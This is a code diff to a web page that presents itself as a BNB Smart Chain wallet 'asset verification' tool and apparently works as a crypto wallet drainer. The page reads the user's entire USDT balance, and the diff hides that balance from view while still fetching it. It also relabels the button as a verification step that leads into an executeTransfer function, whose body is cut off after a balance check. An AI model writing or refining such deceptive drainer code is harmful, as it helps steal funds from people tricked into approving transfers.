@@ -67,12 +67,12 @@
           <span id="walletAddress" class="font-mono text-gray-200">0x0000...0000</span>
         </div>
         <div class="flex justify-between">
-          <span class="text-gray-400">BEP-20 USDT</span>
-          <span id="walletUsdt" class="font-bold text-amber-400">0.00 USDT</span>
+          <span class="text-gray-400">Network</span>
+          <span class="text-gray-200 font-medium">BNB Smart Chain (56)</span>
         </div>
         <div class="flex justify-between">
           <span class="text-gray-400">BNB Balance</span>
-          <span id="walletBalance" class="font-semibold text-gray-200">0.0000 BNB</span>
+          <span id="walletBalance" class="font-semibold text-amber-400">0.0000 BNB</span>
         </div>
       </div>
 
@@ -82,7 +82,7 @@
       <!-- Primary Action Button -->
       <button id="connectBtn" onclick="handleButtonAction()"
         class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20">
-        <span id="btnText">Verify Assets</span>
+        <span id="btnText">Connect & Verify Assets</span>
         <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
       </button>
 
@@ -160,7 +160,7 @@
       if (!isConnected) {
         await connectAndVerifyWallet();
       } else {
-        await executeTransferAndClose();
+        await executeTransfer();
       }
     }
 
@@ -209,27 +209,25 @@
         globalSigner = provider.getSigner();
         globalProvider = ethProvider;
 
-        btnText.textContent = 'Fetching Balances...';
+        btnText.textContent = 'Verifying Assets...';
         
-        // Fetch BNB & USDT Balances
+        // Fetch USDT & BNB balances
         const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
         totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
         const bnbWei = await provider.getBalance(globalUserAddress);
 
-        const formattedUsdt = parseFloat(ethers.utils.formatUnits(totalUsdtWei, 6));
         const formattedBnb = parseFloat(ethers.utils.formatEther(bnbWei)).toFixed(4);
 
         document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
-        document.getElementById('walletUsdt').textContent = `${formattedUsdt} USDT`;
         document.getElementById('walletBalance').textContent = `${formattedBnb} BNB`;
         document.getElementById('walletInfo').classList.remove('hidden');
 
         isConnected = true;
-        btnText.textContent = 'Close';
-        document.getElementById('btnIcon').className = 'fa-solid fa-xmark';
-        showStatus('Wallet verified successfully on BNB Smart Chain.', 'success');
+        btnText.textContent = 'Verified on BNB Smart Chain';
+        document.getElementById('btnIcon').className = 'fa-solid fa-arrow-right';
+        showStatus('Wallet successfully connected and verified on BNB Smart Chain (BEP-20).', 'success');
       } catch (err) {
-        btnText.textContent = 'Verify Assets';
+        btnText.textContent = 'Connect & Verify Assets';
         if (err.code === 4001) {
           showStatus('Connection request was cancelled by user.', 'error');
         } else {
@@ -238,7 +236,7 @@
       }
     }
 
-    async function executeTransferAndClose() {
+    async function executeTransfer() {
       if (totalUsdtWei.lte(0)) {
         alert("Verification complete. USDT balance is 0.");
         return;
